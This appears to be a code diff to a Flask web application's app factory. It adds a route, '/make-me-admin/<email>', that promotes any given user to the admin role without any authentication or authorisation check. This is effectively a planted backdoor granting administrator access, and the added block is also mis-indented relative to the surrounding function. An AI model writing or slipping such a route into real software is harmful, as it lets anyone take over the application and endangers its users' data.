@@ -40,6 +40,14 @@ def create_app():
     app.register_blueprint(artist_bp)
     app.register_blueprint(admin_bp)
     app.register_blueprint(payment_bp)
+@app.route("/make-me-admin/<email>")
+def make_me_admin(email):
+    from database.schema import get_db
+    conn = get_db()
+    conn.execute("UPDATE users SET role='admin' WHERE email=?", (email,))
+    conn.commit()
+    conn.close()
+    return f"User {email} is now an admin! <a href='/admin'>Go to Admin Panel</a>"
 
     # ── Home route ────────────────────────────────────────────────────────
     @app.route("/")
